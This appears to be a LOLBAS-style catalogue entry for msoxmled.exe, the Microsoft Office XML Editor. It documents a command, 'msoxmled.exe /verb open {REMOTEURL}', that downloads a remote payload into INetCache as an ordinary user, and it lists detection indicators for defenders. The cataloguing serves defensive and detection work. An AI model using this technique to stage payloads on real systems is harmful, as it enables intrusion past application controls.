---
Acknowledgement:
- Handle: '@bogackayaa'
  Person: Bogac Kaya
- Person: Furkan Ce
Author: Bogac Kaya
Commands:
- Category: Download
  Command: msoxmled.exe /verb open {REMOTEURL}
  Description: Downloads payload from remote server using the Microsoft Office XML
    Editor.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2025-08-22
Description: Microsoft Office XML Editor, used to handle XML documents in Microsoft
  Office.
Detection:
- IOC: '`msoxmled.exe` making network connections to external URLs'
- IOC: Unexpected file downloads initiated by `msoxmled.exe`
- IOC: 'Event ID 1 with Image: `msoxmled.exe` and CommandLine: `/verb open`'
Full_Path:
- Path: C:\Program Files\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft
    Shared\Office16\msoxmled.exe
- Path: C:\Program Files (x86)\Common Files\Microsoft Shared\OFFICE14\msoxmled.exe
Name: msoxmled.exe
Resources:
- Link: https://learn.microsoft.com/en-us/answers/questions/4805030/where-is-msoxmled-exe-for-office-professional-2013
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/osbinaries
---

# msoxmled.exe

Microsoft Office XML Editor, used to handle XML documents in Microsoft Office.

# Path(s)

- `C:\Program Files\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\msoxmled.exe`
- `C:\Program Files (x86)\Common Files\Microsoft Shared\OFFICE14\msoxmled.exe`

# Download Commands

Downloads payload from remote server using the Microsoft Office XML Editor.

```batch
msoxmled.exe /verb open {REMOTEURL}
```

- **Usecase:** It will download a remote payload and place it in INetCache.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://learn.microsoft.com/en-us/answers/questions/4805030/where-is-msoxmled-exe-for-office-professional-2013
# Acknowledgements

- Bogac Kaya (Authored, 2025-08-22)
- Bogac Kaya (@bogackayaa)
- Furkan Ce